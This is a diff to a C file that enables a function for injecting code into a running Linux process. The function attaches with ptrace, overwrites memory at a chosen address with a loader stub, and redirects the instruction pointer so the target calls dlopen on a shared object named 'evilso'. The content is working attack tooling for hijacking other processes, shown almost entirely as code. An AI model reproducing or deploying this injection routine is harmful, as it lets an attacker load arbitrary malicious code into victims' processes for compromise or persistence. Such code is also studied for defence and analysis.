@@ -131,44 +131,42 @@ void setaddr(unsigned char *buf, ElfW(Addr) addr)
     *(buf + 3) = addr >> 24;
 }
 
-/* void */
-/* inject_code(int pid, char *evilso, ElfW(Addr) dlopen_addr) { */
-/* 	struct	user_regs_struct regz, regzbak; */
-/* 	unsigned long len; */
-/* 	unsigned char *backup = NULL; */
-/* 	unsigned char *loader = NULL; */
-/* 	ElfW(Addr) entry_addr; */
+void
+inject_code(int pid, char *evilso, long dlopen_addr, long inject_position) {
+	struct	user_regs_struct regz, regzbak;
+	unsigned long len;
+	unsigned char *backup = NULL;
+	unsigned char *loader = NULL;
 
-/* 	setaddr(soloader + 12, dlopen_addr); */
+	setaddr(soloader + 12, dlopen_addr);
 
-/* 	entry_addr = locate_start(pid); */
-/* 	printf("[+] entry point: 0x%x\n", entry_addr); */
+	printf("[+] entry point: 0x%x\n", inject_position);
 
-/* 	len = sizeof(soloader) + strlen(evilso); */
-/* 	loader = malloc(sizeof(char)  *len); */
-/* 	memcpy(loader, soloader, sizeof(soloader)); */
-/* 	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso)); */
+	len = sizeof(soloader) + strlen(evilso);
+	loader = malloc(sizeof(char)  *len);
+	memcpy(loader, soloader, sizeof(soloader));
+	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso));
 
-/* 	backup = malloc(len + sizeof(ElfW(Word))); */
-/* 	ptrace_read(pid, entry_addr, backup, len); */
+	backup = malloc(len + sizeof(long));
+	ptrace_read(pid, inject_position, backup, len);
 
-/* 	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1); */
-/* 	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1); */
-/* 	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp); */
+	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
+	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1);
+	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp);
 
-/* 	regz.eip = entry_addr + 2; */
+	regz.eip = inject_position + 2;
 
-/* 	/*code inject *1/ */
-/* 	ptrace_write(pid, entry_addr, loader, len); */
+	/*code inject */
+	ptrace_write(pid, inject_position, loader, len);
 
-/* 	/*set eip as entry_point *1/ */
-/* 	ptrace(PTRACE_SETREGS , pid , NULL , &regz); */
-/* 	ptrace_cont(pid); */
+	/*set eip as entry_point */
+	ptrace(PTRACE_SETREGS , pid , NULL , &regz);
+	ptrace_cont(pid);
 
-/* 	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1); */
-/* 	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip); */
+	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
+	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip);
 
-/* 	/*restore backup data *1/ */
-/* 	// ptrace_write(pid,entry_addr, backup, len); */
-/* 	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak); */
-/* } */
+	/*restore backup data */
+	// ptrace_write(pid,entry_addr, backup, len);
+	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak);
+}
